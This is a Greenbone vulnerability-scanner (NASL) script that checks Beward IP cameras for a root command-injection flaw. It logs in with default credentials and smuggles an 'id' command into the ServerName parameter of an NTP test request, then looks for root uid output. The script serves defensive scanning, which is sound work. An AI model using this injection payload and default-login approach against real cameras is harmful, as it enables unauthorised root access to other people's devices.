# Copyright (C) 2019 Greenbone Networks GmbH
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.114072");
  script_version("2019-04-03T09:59:09+0000");
  script_tag(name:"cvss_base", value:"8.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:P/A:P");
  script_tag(name:"last_modification", value:"2019-04-03 09:59:09 +0000 (Wed, 03 Apr 2019)");
  script_tag(name:"creation_date", value:"2019-02-13 15:39:42 +0100 (Wed, 13 Feb 2019)");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_name("Beward IP Cameras Root Remote Code Execution Vulnerability");
  script_dependencies("gb_beward_ip_cameras_detect_consolidation.nasl", "gb_beward_ip_cameras_default_credentials.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("beward/ip_camera/detected", "beward/ip_camera/credentials");

  script_xref(name:"URL", value:"https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5512.php");

  script_tag(name:"summary", value:"The remote installation of Beward's IP camera software is prone to
  a post-authentication root remote code execution vulnerability.");

  script_tag(name:"impact", value:"This issue may be exploited by a remote attacker to
  inject arbitrary system commands and gain root remote code execution.");

  script_tag(name:"insight", value:"The issue exists, because the software allows for injecting commands into
  specific requests.");

  script_tag(name:"vuldetect", value:"Checks if the host responds with simple requested IDs.");

  script_tag(name:"affected", value:"At least versions M2.1.6.04C014 and before.");

  script_tag(name:"solution", value:"No known solution is available as of 03rd April, 2019.
  Information regarding this issue will be updated once solution details are available.");

  script_tag(name:"solution_type", value:"NoneAvailable");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

CPE = "cpe:/h:beward";

if(!info = get_app_port_from_cpe_prefix(cpe: CPE, service: "www"))
  exit(0);

CPE = info["cpe"];
port = info["port"];

if(!get_app_location(cpe: CPE, port: port)) # nb: Unused but added to have a reference to the Detection-NVT
  exit(0);

creds = get_kb_list("beward/ip_camera/credentials");
if(!creds)
  exit(0);

foreach cred(creds) {

  url = "/cgi-bin/operator/servetest?cmd=ntp&ServerName=pool.ntp.org|id||&TimeZone=03:00";

  req = http_get_req(port: port, url: url, add_headers: make_array("Accept-Encoding", "gzip, deflate",
                                                                   "Authorization", "Basic " + base64(str: cred)));
  res = http_keepalive_send_recv(port: port, data: req);

  #uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
  if("uid=" >< res && "gid=" >< res && "groups=" >< res) {
    report  = report_vuln_url(port: port, url: url);
    report += '\nUsed default credentials for the login and the sent request: (username:password)\n' + cred;
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
